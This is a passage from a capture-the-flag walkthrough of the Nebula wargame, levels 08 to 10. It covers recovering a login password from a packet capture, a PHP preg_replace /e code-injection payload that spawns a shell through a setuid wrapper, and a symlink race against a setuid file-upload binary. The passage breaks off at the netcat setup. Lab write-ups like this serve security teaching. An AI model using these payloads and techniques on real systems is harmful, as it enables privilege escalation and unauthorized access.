&lt;p&gt;The only interesting file that&amp;rsquo;s readable here is &lt;code&gt;capture.pcap&lt;/code&gt;. Let&amp;rsquo;s copy it out and use &lt;em&gt;Wireshark&lt;/em&gt; to take a look at it.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;$&amp;gt; scp level08@192.168.56.102:/home/flag08/capture.pcap .

level08@192.168.56.102&amp;#39;s password:
capture.pcap                                  100% 8302     8.1KB/s   00:00
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Once in Wireshark we can see a TCP stream. Right click on one of the entries and select &lt;code&gt;Follow TCP Stream&lt;/code&gt;. A new window will appear in which we can see a login attempt. Red entries are user input, and blue entries are the server responses. The username is &lt;code&gt;level08&lt;/code&gt;. The password is&amp;hellip; well, take a look. Notice the &lt;code&gt;7f&lt;/code&gt; entries. Those are deletes.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IEseNUh.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IEseNUh.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So&amp;hellip;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level08@nebula:/home/flag08$ ssh flag08@localhost

flag08@localhost&amp;#39;s password: backd00Rmate

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-09:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 09&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;There&amp;rsquo;s a C setuid wrapper for some vulnerable PHP code&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;spam&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($email)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\./&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot; dot &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/@/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot; AT &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email);&lt;/span&gt;
  
  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$email;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;markup&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($filename,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$use_me)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file_get_contents($filename);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/(\[email (.*)\])/e&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;spam(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;\\&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;)&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\[/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;lt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;preg_replace(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/\]/&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents);&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$contents;&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #f8f8f2&#34;&gt;$output&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;markup&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;($argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;$output;&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Let&amp;rsquo;s run it to see what it actually does.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level09@nebula:/home/flag09$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;email mail@test.com&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &amp;gt; /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
mail AT test dot com
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;So the vulnerable part here is the &lt;code&gt;preg_replace&lt;/code&gt; with the &lt;em&gt;e&lt;/em&gt; flag. For information on this see &lt;a href=&#34;https://bugs.php.net/bug.php?id=35960&#34;&gt;https://bugs.php.net/bug.php?id=35960&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;So there&amp;rsquo;s a few ways we can exploit this. We basically need to pass a command to the script that will get executed in the &lt;code&gt;preg_replace&lt;/code&gt;. Let&amp;rsquo;s try to simply get a shell as the &lt;em&gt;flag09&lt;/em&gt; user and get our flag.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;level09@nebula:/home/flag09$ &lt;span style=&#34;color: #f8f8f2&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;[email ${${@system(&amp;#39;&lt;/span&gt;sh&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;)}}]&amp;#39;&lt;/span&gt; &amp;gt; /tmp/test.txt
level09@nebula:/home/flag09$ ./flag09 /tmp/test.txt fasdf
sh-4.2$ whoami
flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h2 id=&#34;level-10:30500b9ac805cc116818bc6edd5ba7d1&#34;&gt;Level 10&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;errno.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argc,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;argv)&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;file;&lt;/span&gt;
  &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;host;&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(argc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;%s file host&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n\t&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;sends file to host if you have access to it&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;host&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

  &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(access(argv[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;R_OK)&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;ffd;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;4096&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;];&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connecting to %s:18211 .. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;fd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;socket(AF_INET,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;SOCK_STREAM,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;memset(&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sin,&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in));&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_family&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;AF_INET;&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_addr.s_addr&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;inet_addr(host);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;sin.sin_port&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;htons(&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;18211&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(connect(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;sin,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;sockaddr_in))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to connect to host %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

&lt;span style=&#34;color: #75715e&#34;&gt;#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(write(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;HITHERE,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strlen(HITHERE))&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to write banner to host %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;host);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#undef HITHERE&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Connected!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;Sending file .. &amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;fflush(stdout);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;ffd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;open(file,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;O_RDONLY);&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(ffd&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Damn. Unable to open file&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;read(ffd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;sizeof&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(buffer));&lt;/span&gt;
    &lt;span style=&#34;color: #66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;(rc&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;Unable to read from file: %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;strerror(errno));&lt;/span&gt;
      &lt;span style=&#34;color: #f8f8f2&#34;&gt;exit(EXIT_FAILURE);&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;write(fd,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;buffer,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;rc);&lt;/span&gt;

    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;wrote file!&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;);&lt;/span&gt;

  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color: #f8f8f2&#34;&gt;printf(&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;You don&amp;#39;t have access to %s&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;file);&lt;/span&gt;
  &lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f8f8f2&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Now this one take a bit of playing around to get it right. Basically what we are exploiting here is that the file gets checked and then gets used. The &lt;code&gt;access&lt;/code&gt; call checks the permissions based on the actual user, not the guid user. The file open calls however will run as the guid user. So in between these two calls, we &lt;em&gt;could&lt;/em&gt; modify the target file and get the program to read the right file.&lt;/p&gt;

&lt;p&gt;So ideally we want to create a symlink to a file we own when the &lt;code&gt;access&lt;/code&gt; call runs, then replace that symlink with one that points to the token file. This relies heavily on timing when to update the symlink. I had a play and this is the most reliable way I have found.&lt;/p&gt;

&lt;p&gt;You will need two shells (both on nebula is fine but optional); call them termA and termB. So in termB startup a listening netcat on the relevant port&lt;/p&gt;

